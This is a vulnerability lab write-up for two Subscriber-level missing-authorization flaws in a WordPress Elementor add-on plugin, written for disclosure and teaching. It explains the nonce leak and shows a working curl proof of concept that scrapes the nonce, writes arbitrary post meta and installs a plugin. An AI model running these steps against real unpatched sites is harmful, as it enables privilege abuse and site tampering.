# News Kit Addons For Elementor < 1.4.9 — Subscriber+ Missing Authorization (×2)

| | |
| --- | --- |
| **CVEs** | [CVE-2026-97352](https://intel.patrowl.io/cves/CVE-2026-97352), [CVE-2026-97353](https://intel.patrowl.io/cves/CVE-2026-97353) |
| **Class (CWE)** | Missing authorization on authenticated AJAX actions (CWE-862) |
| **Auth** | **Subscriber+** (any account that can load a wp-admin page) |
| **Affected** | News Kit Addons For Elementor **< 1.4.9** (confirmed on 1.4.7) |
| **Fixed** | **1.4.9** |
| **Impact** | A Subscriber can **install & activate a plugin** (CVE-2026-97352) and **write arbitrary post meta to any post**, including admin-owned ones (CVE-2026-97353) |
| **Exploits** | `exploit_cve_2026_97352.py`, `exploit_cve_2026_97353.py` |

Two of the plugin's authenticated AJAX handlers (`admin/admin.php`) are gated by
`check_ajax_referer()` **only** — no capability check — and are registered for
every logged-in user via `wp_ajax_*`. The nonce they require is not a privilege
boundary: a broken condition in the admin script loader localizes
`adminObject._wpnonce` on **every** wp-admin page, so a Subscriber reads the
token off `profile.php` and calls either action.

This lab starts from source: both flaws were derived from `admin/admin.php` and
the 1.4.7 → 1.4.9 fix diff, and confirmed end-to-end against the spawned instance.

---

## Root cause

**The nonce leaks to every role.** `handle_scripts()` (hooked to
`admin_enqueue_scripts`) guards its asset/ nonce enqueue with:

```php
if( ! $hook == 'nav-menus.php' && ! in_array( $hook, [ /* plugin pages */ ] ) ) return;
```

`!` binds tighter than `==`, so this parses as `(! $hook) == 'nav-menus.php'` —
`! $hook` is a boolean, and `false == 'nav-menus.php'` is always `false`, so the
early `return` **never runs**. On every wp-admin page the plugin therefore
localizes:

```php
wp_localize_script( 'nekit-admin-main', 'adminObject', [
  '_wpnonce' => wp_create_nonce( 'nekit-admin-nonce' ), ...
]);
```

A Subscriber can load `profile.php` and read `adminObject._wpnonce` straight out
of the HTML. (The script is attached once Elementor is loaded, hence the lab runs
Elementor too.)

**CVE-2026-97352 — `nekit_install_importer` (plugin install/activate):**

```php
add_action( 'wp_ajax_nekit_install_importer', [ $this, 'install_importer' ] );
...
function install_importer() {
    check_ajax_referer( 'nekit-admin-nonce', '_wpnonce' );   // nonce only — no capability check
    $option = sanitize_text_field( wp_unslash( $_POST['option'] ) );
    $file_path = 'blaze-demo-importer/blaze-demo-importer.php';
    if( $option == 'install' ) :
        $url = 'https://downloads.wordpress.org/plugin/blaze-demo-importer.zip';
        ... $upgrader->install( $url );
        activate_plugin( $file_path, '', false, true );
    }
}
```

Any Subscriber pulls `blaze-demo-importer` from wordpress.org and activates it —
a low-privilege user installing and enabling a plugin.

**CVE-2026-97353 — `nekit_update_mega_menu_form` (arbitrary post meta):**

```php
add_action( 'wp_ajax_nekit_update_mega_menu_form', [ $this, 'update_mega_menu_form' ] );
...
function update_mega_menu_form() {
    check_ajax_referer( 'nekit-admin-nonce', 'security' );    // nonce only — no capability / ownership check
    $form_data = sanitize_text_field( wp_unslash( $_POST['formData'] ) );
    $menu      = absint( wp_unslash( $_POST['menu'] ) );
    $form_data = json_decode( $form_data, true );
    foreach( $form_data as $field_data ) :
        update_post_meta( $menu, $field_data['name'], $field_data['value'] );   // attacker key+value, attacker post
    endforeach;
}
```

`menu`, and each meta `name`/`value`, are attacker-controlled, so a Subscriber
writes any meta key (including protected core keys such as `_wp_page_template`)
onto any post — including posts owned by administrators. The very next handler
(`create_template_action`) *does* call `current_user_can()`, which makes the
omission here plain.

**Fix (1.4.9):** capability checks are added to the handlers
(`install_plugins`/`activate_plugins` on `install_importer`, `edit_theme_options`
on `update_mega_menu_form`) and the nonce is no longer localized for users
without the required capability.

---

## Spawn

```bash
./setup.sh          # downloads 1.4.7, spawns WP + Elementor, creates the Subscriber attacker + an admin-owned target post
```

WordPress comes up at `http://127.0.0.1:8093` (admin/admin — the victim).
`setup.sh` installs Elementor, activates the vulnerable plugin, creates the
attacker `subscriber`/`subscriber`, creates an administrator-owned post (the
victim of the meta write), and records fixtures in `.lab-ids`.

## Exploits

### CVE-2026-97353 — arbitrary post-meta write

```bash
./exploit_cve_2026_97353.py
```

```
[+] Logged in as Subscriber (wordpress_logged_in_* cookie set)
[+] Harvested nekit-admin-nonce from http://127.0.0.1:8093/wp-admin/profile.php: 54502c8344
[*] Negative control (no nonce): HTTP 403, body='-1' -> rejected
[*] POST admin-ajax.php  action=nekit_update_mega_menu_form  menu=4  (writing 'ptr_pwned_marker' + nekit_mega_menu_option as Subscriber)
[*] Server response (HTTP 200): {'success': True, 'data': {'updated': True}}
[*] Read-back via nekit_render_mega_menu_modal: marker PTRXSS061081 FOUND in the admin post's rendered meta

==> VULNERABLE (CVE-2026-97353): a Subscriber wrote attacker-controlled
    post meta ... onto administrator-owned post 4, with no capability or ownership check.
```

It writes an arbitrary attacker key (`ptr_pwned_marker`) plus a readable key
(`nekit_mega_menu_option`) onto the admin-owned post, then reads the marker back
through the sibling nonce-only `nekit_render_mega_menu_modal` action — proving the
write physically landed. The no-nonce negative control (`-1` / HTTP 403) shows
the nonce is the only gate.

### CVE-2026-97352 — plugin install & activation

```bash
./exploit_cve_2026_97352.py
```

```
[+] Logged in as Subscriber (wordpress_logged_in_* cookie set)
[+] Baseline: blaze-demo-importer not installed
[+] Harvested nekit-admin-nonce from http://127.0.0.1:8093/wp-admin/profile.php: 65f1dda90a
[*] POST admin-ajax.php  action=nekit_install_importer  option=install  (as Subscriber, no install_plugins capability)
[*] Server response (HTTP 200): {'success': True, 'data': {'status': True, 'message': 'Demo importer plugin installed and activated'}}

==> VULNERABLE (CVE-2026-97352): a Subscriber installed and activated the
    'blaze-demo-importer' plugin from wordpress.org via nekit_install_importer.
```

It confirms the plugin was not present, then — after the call — detects the
plugin files served by Apache at `/wp-content/plugins/blaze-demo-importer/`,
proving a Subscriber installed it.

Both exploits print `VULNERABLE` (exit 0) against 1.4.7 and `NOT vulnerable`
(exit 1) against 1.4.9 (the nonce is no longer handed to the Subscriber and the
handlers enforce capabilities).

### Manual PoC (`curl`)

```bash
B=http://127.0.0.1:8093

# 1) Log in as the Subscriber and read the leaked nonce off profile.php.
curl -s -c jar.txt -b "wordpress_test_cookie=WP+Cookie+check" \
  "$B/wp-login.php" --data "log=subscriber&pwd=subscriber&wp-submit=Log+In&redirect_to=$B/wp-admin/&testcookie=1" -o /dev/null
N=$(curl -s -b jar.txt "$B/wp-admin/profile.php" | grep -oE '"_wpnonce":"[0-9a-f]+"' | grep -oE '[0-9a-f]{8,12}')

# 2a) CVE-2026-97353 — write arbitrary meta to admin-owned post id 4.
curl -s -b jar.txt "$B/wp-admin/admin-ajax.php" \
  --data-urlencode 'formData=[{"name":"ptr_pwned_marker","value":"PTR-OWNED"}]' \
  --data "action=nekit_update_mega_menu_form&security=$N&menu=4"
#   -> {"success":true,"data":{"updated":true}}

# 2b) CVE-2026-97352 — install + activate blaze-demo-importer.
curl -s -b jar.txt "$B/wp-admin/admin-ajax.php" \
  --data "action=nekit_install_importer&option=install&_wpnonce=$N"
#   -> {"success":true,"data":{"status":true,"message":"Demo importer plugin installed and activated"}}
```

## Verify the patch

```bash
# swap the fixed 1.4.9 admin/admin.php into place and re-run either exploit — both
# are rejected (exit 1): the nonce is no longer shown to the Subscriber, and the
# handlers enforce capability checks (install_plugins/activate_plugins,
# edit_theme_options).
```

## Cleanup

```bash
docker compose down -v
```

> ⚠️ Intentionally vulnerable — a Subscriber can install plugins and tamper with
> admin content. Run locally / isolated only, never exposed to the internet.
